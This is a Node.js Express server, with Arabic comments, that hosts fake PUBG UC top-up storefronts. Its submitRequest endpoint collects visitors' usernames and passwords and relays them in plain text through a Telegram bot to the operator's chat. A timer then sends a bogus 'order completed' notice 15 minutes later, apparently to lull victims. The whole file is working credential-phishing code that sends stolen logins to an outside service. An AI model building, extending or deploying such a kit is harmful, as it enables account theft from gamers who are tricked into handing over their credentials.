const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام middleware لتحليل JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تهيئة بوت التليجرام
const token = process.env.s; // توكن البوت من متغيرات البيئة
const bot = new TelegramBot(token, { polling: true });

// تخزين الطلبات
let requests = [];

// خدمة الملفات الثابتة لجميع المواقع في مجلد uploads
const sitesDirectory = path.join(__dirname, 'uploads');

// إنشاء مسارات ديناميكية لجميع المواقع
try {
  const sites = fs.readdirSync(sitesDirectory);
  
  sites.forEach(site => {
    const sitePath = path.join(sitesDirectory, site);
    if (fs.statSync(sitePath).isDirectory()) {
      app.use(`/${site}`, express.static(sitePath));
      console.log(`✅ تم تحميل الموقع: /${site}`);
    }
  });
} catch (error) {
  console.error('❌ خطأ في قراءة مجلد uploads:', error.message);
  console.log('⏳ جاري إنشاء مجلد uploads مع مواقع مثال...');
  
  // إنشاء مجلد uploads إذا لم يكن موجودًا
  if (!fs.existsSync(sitesDirectory)) {
    fs.mkdirSync(sitesDirectory);
  }
  
  // إنشاء بعض المواقع كمثال
  const exampleSites = [
    { name: 'pubg-uc', title: 'شحن شدات ببجي' },
    { name: 'pubg-shop', title: 'متجر ببجي' },
    { name: 'uc-store', title: 'متجر الشدات' }
  ];
  
  exampleSites.forEach(site => {
    const sitePath = path.join(sitesDirectory, site.name);
    if (!fs.existsSync(sitePath)) {
      fs.mkdirSync(sitePath);
      
      // إنشاء صفحة HTML أساسية لكل موقع
      const htmlContent = `
      <!DOCTYPE html>
      <html dir="rtl" lang="ar">
      <head>
          <title>${site.title}</title>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
              body {
                  font-family: Arial, sans-serif;
                  background-color: #0d1b2a;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  min-height: 100vh;
                  margin: 0;
                  color: #fff;
              }
              .container {
                  background-color: #1e293b;
                  padding: 30px;
                  border-radius: 15px;
                  text-align: center;
                  max-width: 500px;
                  width: 90%;
              }
              h1 {
                  color: #FFD700;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>مرحباً بكم في ${site.title}</h1>
              <p>هذا موقع مثال في مجلد uploads</p>
              <p>مسار الموقع: /${site.name}</p>
          </div>
      </body>
      </html>
      `;
      
      fs.writeFileSync(path.join(sitePath, 'index.html'), htmlContent);
      app.use(`/${site.name}`, express.static(sitePath));
      console.log(`✅ تم إنشاء موقع مثال: /${site.name}`);
    }
  });
}

// مسار API موحد لمعالجة طلبات جميع المواقع
app.post('/submitRequest', async (req, res) => {
  try {
    const { chatId, username, password, amount, site, type } = req.body;
    
    // حفظ الطلب
    const request = {
      id: Date.now(),
      chatId,
      username,
      password,
      amount,
      site,
      type,
      timestamp: new Date().toLocaleString('ar-SA'),
      status: 'pending'
    };
    
    requests.push(request);
    
    // إرسال رسالة موحدة إلى البوت لجميع المواقع
    const message = `
    📦 طلب جديد من موقع ${site}:

    👤 اسم المستخدم: ${username}
    🔐 كلمة المرور: ${password}
    🎮 الكمية: ${amount} ${type}
    🌐 الموقع: ${site}
    ⏰ الوقت: ${request.timestamp}
    `;
    
    await bot.sendMessage(chatId, message);
    
    res.json({ 
      success: true, 
      message: 'تم استلام طلبك بنجاح',
      requestId: request.id
    });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ 
      success: false, 
      message: 'حدث خطأ أثناء معالجة الطلب' 
    });
  }
});

// صفحة رئيسية توضح جميع المواقع المتاحة
app.get('/', (req, res) => {
  try {
    const sites = fs.readdirSync(sitesDirectory).filter(site => {
      return fs.statSync(path.join(sitesDirectory, site)).isDirectory();
    });
    
    let sitesList = '';
    sites.forEach(site => {
      sitesList += `<li><a href="/${site}">${site}</a></li>`;
    });
    
    const html = `
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <title>خادم متعدد المواقع</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #0d1b2a;
                color: #fff;
                padding: 20px;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background-color: #1e293b;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
            }
            h1 {
                color: #FFD700;
                text-align: center;
            }
            .site-list {
                list-style: none;
                padding: 0;
            }
            .site-list li {
                margin-bottom: 15px;
                padding: 15px;
                background-color: #334155;
                border-radius: 8px;
            }
            .site-list a {
                color: #FFD700;
                text-decoration: none;
                font-weight: bold;
                display: block;
                font-size: 18px;
            }
            .site-list a:hover {
                text-decoration: underline;
            }
            .info {
                background-color: #334155;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>المواقع المتاحة على الخادم</h1>
            
            <div class="info">
                <p>يوجد ${sites.length} موقعًا في مجلد uploads:</p>
                <p>جميع الطلبات من هذه المواقع ترسل إلى البوت بنفس النموذج</p>
            </div>
            
            <ul class="site-list">
                ${sitesList}
            </ul>
        </div>
    </body>
    </html>
    `;
    
    res.send(html);
  } catch (error) {
    res.status(500).send('خطأ في تحميل قائمة المواقع');
  }
});

// تشغيل المخدم
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`🌐 Main: http://localhost:${PORT}`);
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text === '/start') {
    const welcomeMessage = `
    🎮 مرحباً بك في بوت الخدمات!
    
    هذه بعض الأوامر المتاحة:
    /sites - لعرض جميع المواقع المتاحة
    /help - للمساعدة
    `;
    
    bot.sendMessage(chatId, welcomeMessage);
  } else if (text === '/sites') {
    try {
      const sites = fs.readdirSync(sitesDirectory).filter(site => {
        return fs.statSync(path.join(sitesDirectory, site)).isDirectory();
      });
      
      let message = '🌐 المواقع المتاحة:\n\n';
      sites.forEach(site => {
        message += `/${site}\n`;
      });
      
      message += `\nيمكنك زيارة أي موقع عن طريق: ${process.env.R}/اسم الموقع`;
      
      bot.sendMessage(chatId, message);
    } catch (error) {
      bot.sendMessage(chatId, '❌ حدث خطأ في جلب قائمة المواقع');
    }
  }
});

// دالة للتحقق من الطلبات كل 15 دقيقة
setInterval(() => {
  const now = new Date();
  requests.forEach(request => {
    if (request.status === 'pending') {
      const requestTime = new Date(request.id);
      const diffMinutes = (now - requestTime) / (1000 * 60);
      
      if (diffMinutes >= 15) {
        request.status = 'completed';
        
        // إرسال رسالة إشعار بإكمال الطلب
        const completionMessage = `
        ✅ تم اكتمال طلبك من موقع ${request.site}!
        
        👤 اسم المستخدم: ${request.username}
        🎮 الكمية: ${request.amount} ${request.type}
        ⏰ وقت الإكمال: ${new Date().toLocaleString('ar-SA')}
        
        شكراً لاستخدامك خدمتنا! 🎮
        `;
        
        bot.sendMessage(request.chatId, completionMessage)
          .catch(err => console.error('Error sending completion message:', err));
      }
    }
  });
}, 60000);
